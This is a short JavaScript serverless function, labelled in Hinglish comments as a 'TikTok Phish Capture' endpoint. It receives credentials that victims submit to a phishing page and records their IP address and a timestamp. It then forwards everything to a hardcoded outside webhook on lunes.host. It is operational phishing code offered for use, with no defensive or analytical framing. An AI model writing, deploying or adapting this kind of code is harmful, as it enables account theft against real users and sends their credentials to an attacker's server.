/**
 * Vercel Serverless Function - TikTok Phish Capture
 * POST /api/capture
 * 
 * Yeh data capture karta hai aur bot tak forward karta hai
 */

// ============================================
// 🔐 APNA BOT KA WEBHOOK URL YAHAN LAGAO
// ============================================
// Jab victim credentials dale to ye URL call hoga
const BOT_WEBHOOK_URL = 'http://node69.lunes.host:3137/phish/capture';

export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method === 'POST') {
        try {
            const data = req.body;
            const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                       req.headers['x-real-ip'] || 
                       'unknown';
            
            // Add IP and timestamp
            data.ip = ip;
            data.timestamp = new Date().toISOString();
            
            // Send to your bot's webhook
            if (BOT_WEBHOOK_URL) {
                fetch(BOT_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(e => console.error('Webhook error:', e.message));
            }
            
            // Log to Vercel
            console.log(`🎯 CAPTURE: ${data.email || data.username || 'unknown'} | ${ip}`);
            
            return res.status(200).json({ 
                status: 'ok', 
                message: 'Capture successful',
                id: data.id || 'generated'
            });
        } catch (error) {
            console.error('Capture error:', error);
            return res.status(500).json({ status: 'error', message: error.message });
        }
    }
    
    // GET request - show status
    return res.status(200).json({
        status: 'active',
        service: 'tiktok-phish',
        message: 'Capture endpoint ready'
    });
}
